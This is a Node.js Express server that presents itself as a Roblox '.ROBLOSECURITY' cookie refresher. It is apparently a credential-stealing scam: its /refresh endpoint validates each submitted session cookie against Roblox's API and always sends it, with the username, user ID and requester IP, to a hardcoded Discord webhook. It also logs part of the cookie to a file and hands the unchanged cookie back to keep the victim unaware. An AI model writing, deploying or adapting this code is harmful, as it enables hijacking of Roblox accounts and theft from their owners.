const express = require('express');
const axios = require('axios');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Discord webhook URL (keep this secret in production)
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB';

// Simple cookie validation
async function validateCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` },
            timeout: 5000,
            validateStatus: () => true
        });
        
        return {
            valid: response.status === 200,
            status: response.status,
            data: response.data || null,
            userAgent: 'Direct Validation'
        };
    } catch (error) {
        console.error('Validation error:', error.message);
        return {
            valid: false,
            error: error.message
        };
    }
}

// Main endpoint - always returns original cookie
app.get('/refresh', async (req, res) => {
    console.log('\n=== /refresh endpoint called ===');
    const startTime = Date.now();
    
    const roblosecurityCookie = req.query.cookie;
    
    if (!roblosecurityCookie) {
        return res.json({
            success: false,
            error: "No cookie provided",
            usage: "Use ?cookie=YOUR_ROBLOSECURITY_COOKIE"
        });
    }
    
    console.log(`Processing cookie (${roblosecurityCookie.length} chars)`);
    
    // STEP 1: Validate the cookie
    const validation = await validateCookie(roblosecurityCookie);
    const finalCookie = roblosecurityCookie; // Always return original
    
    // STEP 2: Try to get user data (even if validation fails, we'll still send webhook)
    let userData = {
        username: 'Unknown',
        uid: 'Unknown',
        displayName: 'Unknown',
        createdAt: 'Unknown',
        country: 'Unknown',
        balance: 0,
        isTwoStepVerificationEnabled: false,
        isPinEnabled: false,
        isPremium: false,
        creditbalance: 0,
        rap: 0,
        avatarUrl: ''
    };
    
    // Try to extract user info from cookie if validation fails
    try {
        if (validation.valid && validation.data) {
            userData = {
                username: validation.data.name || 'Unknown',
                uid: validation.data.id || 'Unknown',
                displayName: validation.data.displayName || validation.data.name || 'Unknown',
                createdAt: validation.data.created || 'Unknown',
                country: 'Unknown', // Not available in this endpoint
                balance: 0, // Would need separate API call
                isTwoStepVerificationEnabled: false,
                isPinEnabled: false,
                isPremium: false,
                creditbalance: 0,
                rap: 0,
                avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${validation.data.id}&width=420&height=420&format=png`
            };
        }
    } catch (error) {
        console.error('Failed to parse user data:', error.message);
    }
    
    // STEP 3: Log to file
    const logEntry = {
        timestamp: new Date().toISOString(),
        ip: req.ip,
        cookieLength: finalCookie.length,
        validationStatus: validation.valid ? 'VALID' : 'INVALID',
        validationCode: validation.status,
        finalCookie: finalCookie.substring(0, 50) + '...', // Only log first 50 chars for security
        username: userData.username,
        userId: userData.uid
    };
    
    try {
        fs.appendFileSync('cookie_logs.json', JSON.stringify(logEntry, null, 2) + ',\n');
        console.log('Logged to file');
    } catch (error) {
        console.error('Failed to write log:', error.message);
    }
    
    // STEP 4: Send to Discord webhook (ALWAYS send, even if validation fails)
    try {
        const processingTime = Date.now() - startTime;
        
        // Determine embed color based on validation
        const embedColor = validation.valid ? 65280 : 16711680; // Green if valid, Red if invalid
        
        // Prepare fields for Discord embed
        const fields = [
            { name: 'Status', value: validation.valid ? '✅ VALID' : '❌ INVALID', inline: true },
            { name: 'Response Code', value: validation.status?.toString() || 'N/A', inline: true },
            { name: 'Cookie Length', value: `${finalCookie.length} chars`, inline: true },
            { name: 'Username', value: userData.username, inline: true },
            { name: 'User ID', value: userData.uid, inline: true },
            { name: 'Processing Time', value: `${processingTime}ms`, inline: true }
        ];
        
        // Add error info if validation failed
        if (!validation.valid && validation.error) {
            fields.push({ 
                name: 'Error', 
                value: validation.error.substring(0, 1000), 
                inline: false 
            });
        }
        
        // Add IP info (for tracking)
        fields.push({ 
            name: 'Request IP', 
            value: req.ip || 'Unknown', 
            inline: false 
        });
        
        // Prepare Discord embed
        const embed = {
            title: validation.valid ? '✅ Cookie Processed' : '❌ Cookie Invalid',
            description: validation.valid 
                ? `**Cookie processed successfully**\nUser: **${userData.username}** (ID: ${userData.uid})`
                : `**Cookie validation failed**\nStatus Code: ${validation.status}`,
            color: embedColor,
            timestamp: new Date().toISOString(),
            fields: fields,
            footer: {
                text: 'Cookie Processor'
            }
        };
        
        // Add thumbnail if we have user ID
        if (userData.uid !== 'Unknown') {
            embed.thumbnail = {
                url: userData.avatarUrl
            };
        }
        
        // Send to Discord
        await axios.post(WEBHOOK_URL, {
            embeds: [embed],
            username: 'Cookie Processor',
            avatar_url: 'https://www.roblox.com/favicon.ico'
        });
        
        console.log('Webhook sent successfully');
        
    } catch (webhookError) {
        console.error('Failed to send webhook:', webhookError.message);
        // Don't fail the request if webhook fails
    }
    
    // STEP 5: Return response (ALWAYS includes the original cookie)
    res.json({
        success: validation.valid,
        // For frontend compatibility - return same structure as before
        redemptionResult: {
            refreshedCookie: finalCookie, // Always the original cookie
            success: validation.valid
        },
        // Additional info
        cookie: finalCookie,
        cookieLength: finalCookie.length,
        validation: {
            valid: validation.valid,
            status: validation.status,
            username: userData.username,
            userId: userData.uid
        },
        // Keep old structure for compatibility
        authTicket: "N/A - Original Cookie Returned",
        message: validation.valid 
            ? "Cookie is valid and returned unchanged" 
            : "Cookie may be invalid, but returned as requested"
    });
});

// Simple health check
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        endpoints: ['/refresh?cookie=ROBLOSECURITY', '/health']
    });
});

// Serve a simple frontend
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`✅ Server is running on port ${PORT}`);
    console.log(`📞 Endpoint: GET /refresh?cookie=ROBLOSECURITY`);
    console.log(`🌐 Health check: GET /health`);
});